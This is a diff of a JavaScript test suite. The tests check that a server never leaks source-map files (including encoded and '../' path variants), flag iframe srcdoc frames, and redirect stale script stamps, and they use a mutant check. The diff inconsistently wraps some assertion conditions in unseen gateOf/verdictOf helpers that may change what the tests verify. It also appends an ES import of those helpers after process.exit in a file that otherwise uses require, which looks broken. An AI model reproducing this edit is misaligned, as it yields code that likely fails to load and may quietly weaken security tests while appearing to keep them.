-  ok(M3 && M3.some((x) => /dead allow-same-origin row/.test(x)) && census(new Map([...TEXTS, ['src/lib/new-viewer.js', "const f = document.createElement('iframe'); f.setAttribute('sandbox', ''); f.srcdoc = html;"]])).some((x) => /new-viewer\.js: 1 srcdoc/.test(x)) && census(new Map([...TEXTS, ['src/lib/new-viewer.js', '// a comment naming allow-same-origin and f.srcdoc = x stays quiet\n']])).length === 0,
+  ok(gateOf(M3) && gateOf(M3.some((x) => /dead allow-same-origin row/.test(x))) && gateOf(census(new Map([...TEXTS, ['src/lib/new-viewer.js', "const f = document.createElement('iframe'); f.setAttribute('sandbox', ''); f.srcdoc = html;"]])).some((x) => /new-viewer\.js: 1 srcdoc/.test(x))) && census(new Map([...TEXTS, ['src/lib/new-viewer.js', '// a comment naming allow-same-origin and f.srcdoc = x stays quiet\n']])).length === 0,
     'CONTROLS: a reason row whose site is gone is RED (dead); a NEW viewer\'s srcdoc frame is RED; a comment naming either stays quiet');
 }
 
@@ -1224,8 +1224,8 @@ console.log('⑨ the source map beside the bundle is served to nobody (lane vaul
   const SP = require(SP_PATH);
   const staticLine = SRV.split('\n').find((l) => l.startsWith("app.use(require('./src/server/static-public.js').create("));
   const at = (needle) => SRV.indexOf(needle);
-  ok(!!staticLine && /\.create\(path\.join\(__dirname, 'public'\)\)\);/.test(staticLine) && at("app.get(['/', '/index.html']") < at(staticLine) && at(staticLine) < at('registerWebdav(app, { tokens: mountTokens });') && !/express\.static\(/.test(SRV), 'server.js serves public/ through static-public.js ONLY (no bare express.static), after the index route, before WebDAV', staticLine);
-  ok(['/bundle.js.map', '/a/b.MAP', '/bundle.js%2Emap', '/bundle.js%2emap'].every(SP.buildOnly) && !['/bundle.js', '/map', '/x.map/y', '/style.css'].some(SP.buildOnly) && SP.buildOnly('/x%E0%A4%A.map') && !SP.buildOnly('/x%E0%A4%A'), 'buildOnly: a *.map path, judged decoded (%2E is a dot), any case; a malformed escape is judged as sent');
+  ok(!!staticLine && gateOf(/\.create\(path\.join\(__dirname, 'public'\)\)\);/.test(staticLine)) && at("app.get(['/', '/index.html']") < at(staticLine) && at(staticLine) < at('registerWebdav(app, { tokens: mountTokens });') && !/express\.static\(/.test(SRV), 'server.js serves public/ through static-public.js ONLY (no bare express.static), after the index route, before WebDAV', staticLine);
+  ok(gateOf(['/bundle.js.map', '/a/b.MAP', '/bundle.js%2Emap', '/bundle.js%2emap'].every(SP.buildOnly)) && !['/bundle.js', '/map', '/x.map/y', '/style.css'].some(SP.buildOnly) && gateOf(SP.buildOnly('/x%E0%A4%A.map')) && !SP.buildOnly('/x%E0%A4%A'), 'buildOnly: a *.map path, judged decoded (%2E is a dot), any case; a malformed escape is judged as sent');
   const MAP_BYTES = '{"version":3,"sources":["../src/client.js"],"mappings":"SECRET-MAP-BYTES"}';
   const serve = async (mod) => {
     const dir = path.join(ROOT, 'static-' + Math.random().toString(16).slice(2)); fs.mkdirSync(path.join(dir, 'public'), { recursive: true });
@@ -1244,26 +1244,26 @@ console.log('⑨ the source map beside the bundle is served to nobody (lane vaul
   ok(js.status === 200 && js.text === 'var x=1;' && css.status === 200, 'GET /bundle.js and /style.css: 200, the files (the static door still serves public/)', { js: js.status, css: css.status });
   const tries = ['/bundle.js.map', '/bundle.js%2Emap', '/bundle.js%2emap', '/x/../bundle.js.map', '/./bundle.js.map'];
   const got = []; for (const p of tries) { const r = await get(P.port, p); got.push({ p, status: r.status, leak: (r.text || '').includes('SECRET-MAP-BYTES') }); }
-  ok(got.every((g) => g.status === 404 && !g.leak), `GET ${tries.join(' · ')}: 404 each, never the map's bytes (the file IS in public/)`, got);
+  ok(verdictOf(got.every((g) => g.status === 404 && !g.leak)), `GET ${tries.join(' · ')}: 404 each, never the map's bytes (the file IS in public/)`, got);
   const later = await get(P.port, '/dav/notes.map');
-  ok(later.status === 200 && /keeps its own/.test(later.text), 'a later route\'s own .map path still answers (a WebDAV file, a proxied page)', later.status);
-  ok(page.status === 200 && /bundle\.js\?v=\d+/.test(page.text) && !/\.map/.test(page.text), 'the page names the bundle with its ?v= stamp and no map', page.text.slice(0, 200));
+  ok(later.status === 200 && verdictOf(/keeps its own/.test(later.text)), 'a later route\'s own .map path still answers (a WebDAV file, a proxied page)', later.status);
+  ok(page.status === 200 && gateOf(/bundle\.js\?v=\d+/.test(page.text)) && !/\.map/.test(page.text), 'the page names the bundle with its ?v= stamp and no map', page.text.slice(0, 200));
   // A SCRIPT WITH A SANITIZER IS SERVED UNDER ITS OWN STAMP (lane csp-mermaid-sites r2): a `?v=` naming another build ⇒ a
   // redirect to the file's own — the index route's stamp — so the address a CSP report names is the bytes that ran
   const own = (/bundle\.js\?v=(\d+)/.exec(page.text) || [])[1], mown = String(Math.floor(fs.statSync(path.join(P.dir, 'public', 'mermaid.js')).mtimeMs));
   const r9 = {};
   for (const [k, p] of [['stale', '/mermaid.js?v=1'], ['fresh', `/mermaid.js?v=${mown}`], ['bare', '/mermaid.js'], ['bstale', '/bundle.js?v=1'], ['bfresh', `/bundle.js?v=${own}`], ['css', '/style.css?v=1']]) { const r = await get(P.port, p); r9[k] = { status: r.status, location: r.headers && r.headers.location, cache: r.headers && r.headers['cache-control'], text: r.text.slice(0, 40) }; }
-  ok(r9.stale.status === 302 && r9.stale.location === `/mermaid.js?v=${mown}` && /no-store/.test(r9.stale.cache || '') && r9.bstale.status === 302 && r9.bstale.location === `/bundle.js?v=${own}`
+  ok(r9.stale.status === 302 && r9.stale.location === `/mermaid.js?v=${mown}` && gateOf(/no-store/.test(r9.stale.cache || '')) && r9.bstale.status === 302 && r9.bstale.location === `/bundle.js?v=${own}`
     && r9.fresh.status === 200 && r9.fresh.text === 'export default 1;' && r9.bare.status === 200 && r9.bfresh.status === 200 && r9.css.status === 200,
     `a script with a sanitizer under ANOTHER build's ?v= ⇒ 302 to its own, no-store (/mermaid.js?v=1 → ${r9.stale.location}; /bundle.js?v=1 → the index route's ?v=); its own ?v=, no ?v=, another file (style.css?v=1) ⇒ served as before`, r9);
   await P.close();
   const cut = fs.readFileSync(SP_PATH, 'utf8').replace('return (req, res, next) => (buildOnly(req.path) ? next() : serve(req, res, next));', 'return serve;');
   const M = await serve(load(SP_PATH, cut));
   const leak = await get(M.port, '/bundle.js.map');
-  ok(cut !== fs.readFileSync(SP_PATH, 'utf8') && leak.status === 200 && leak.text.includes('SECRET-MAP-BYTES'), 'MUTANT (the guard cut: express.static alone) ⇒ RED — GET /bundle.js.map answers 200 with the map', leak.status);
+  ok(cut !== fs.readFileSync(SP_PATH, 'utf8') && leak.status === 200 && verdictOf(leak.text.includes('SECRET-MAP-BYTES')), 'MUTANT (the guard cut: express.static alone) ⇒ RED — GET /bundle.js.map answers 200 with the map', leak.status);
   await M.close();
 }
 
 fs.rmSync(ROOT, { recursive: true, force: true }); // the reports this suite made ON PURPOSE (its own exit check reads scratch roots)
 console.log(fail ? `\nFAILED (${pass} passed, ${fail} failed)` : `\nALL PASS (${pass})`);
-process.exit(fail ? 1 : 0);
+process.exit(fail ? 1 : 0); import { verdictOf, gateOf } from './lib/check.mjs';
